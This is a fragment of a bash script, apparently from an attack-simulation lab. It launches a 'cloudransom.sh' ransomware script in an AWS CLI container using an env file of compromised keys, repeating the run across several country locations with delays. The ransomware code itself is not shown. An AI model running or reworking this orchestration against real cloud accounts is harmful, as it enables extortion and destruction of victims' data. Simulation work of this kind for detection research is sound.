...
LOGFILE=/tmp/attacker_cloud_ransomware_auto-paid.sh.log
function log {
...
function execute_script {
    if [ $SECONDS_WAITED -lt $MAX_WAIT ]; then
        ...
        log "Executing cloudransom.sh"
        bash start.sh --container=aws-cli --env-file=.env-aws-compromised_keys_user --script="cloudransom.sh" >> $LOGFILE 2>&1
        log "Done cloudransom.sh."
    else
...
log "Wait attack_delay seconds before starting attacker cloudransom.sh..."
sleep attack_delay

SERVERS="AU JP NL SG LV CR IS"
for SERVER in $SERVERS; do
    log "Wait 60 seconds before starting attacker cloudransom.sh..."
    sleep 60
